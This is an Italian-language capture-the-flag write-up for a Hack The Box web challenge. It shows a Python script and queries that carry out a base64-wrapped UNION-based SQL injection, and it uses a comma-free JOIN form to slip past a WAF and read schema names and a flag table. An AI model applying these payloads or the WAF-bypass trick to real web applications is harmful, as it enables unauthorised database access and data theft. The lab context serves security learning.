## Information Gathering

Avviata l'istanza ne verifico l'entità. Essendo una web challenge mi aspetto un servizio in ascolto sulla porta 80.

Trovo un servizio con diversi errori PHP. Quindi aggiusto l'URL con i parametri HTML mancanti per arrivare a zero errori:

/obj=*String_b64_encoded*

A questo punto provo ad eseguire delle query per testare la vulnerabilità a SQLi. (Siccome diventa troppo meccanica la cosa scrivo uno scriptino in python):

```
import base64
import requests
from bs4 import BeautifulSoup as bs

url = "http://docker.hackthebox.eu:31671/?obj="

payload = base64.b64encode(
    "{\"ID\":\"'UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata)b#\"}")

send = url + payload
result = requests.get(send)
flag = bs(result.text, 'html.parser')
flag.prettify()
print "[*] URL: {} \n".format(send)
print flag.center.get_text()
```
La query è stata così formattata per bypassare il WAF poiché una query del tipo "{\"ID\":\"'UNION SELECT 1,2\"}" risulta essere bloccata.

Dopo una serie di query arrivo al nome della tabella e della colonna a me interessata:

> "{\"ID\":\"'UNION SELECT * FROM (SELECT 1)a JOIN (SELECT * FROM ezpz.FlagTableUnguessableEzPZ)b#\"}"
